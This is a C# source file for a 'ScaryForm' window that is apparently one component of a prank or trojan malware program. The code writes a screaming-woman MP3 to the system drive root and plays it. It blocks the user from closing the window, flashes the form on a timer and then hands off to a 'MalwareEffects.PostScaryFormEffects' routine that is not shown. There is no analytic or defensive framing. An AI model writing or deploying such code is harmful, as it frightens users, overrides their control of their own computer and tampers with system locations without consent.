using System;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public partial class ScaryForm : Form
{
    [DllImport("winmm.dll")]
    private static extern uint mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hWndCallback);

    private bool _currentState = false;

    public ScaryForm()
    {
        InitializeComponent();

        timer1.Start();
        timer2.Start();

        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        File.WriteAllBytes($"{rootDir}\\woman_screaming.mp3", Saientologi.Properties.Resources.woman_screaming);
        mciSendString($"open \"{rootDir}\\woman_screaming.mp3\" alias woman_screaming", null, 0, IntPtr.Zero);
        mciSendString("play woman_screaming", null, 0, IntPtr.Zero);
    }

    private void ScaryForm_FormClosing(object sender, FormClosingEventArgs e)
    {
        e.Cancel = true;
    }

    private void timer2_Tick(object sender, System.EventArgs e)
    {
        if (!_currentState)
        {
            _currentState = true;
            Hide();
        }
        else
        {
            _currentState = false;
            Show();
        }
    }

    private void timer1_Tick(object sender, System.EventArgs e)
    {
        mciSendString("stop woman_screaming", null, 0, IntPtr.Zero);
        mciSendString("close woman_screaming", null, 0, IntPtr.Zero);

        timer1.Stop();
        timer2.Stop();

        TopMost = false;
        Opacity = 0;
        Size = new Size(0, 0);
        Visible = false;
        WindowState = FormWindowState.Minimized;
        Hide();

        MalwareEffects.PostScaryFormEffects();
    }
}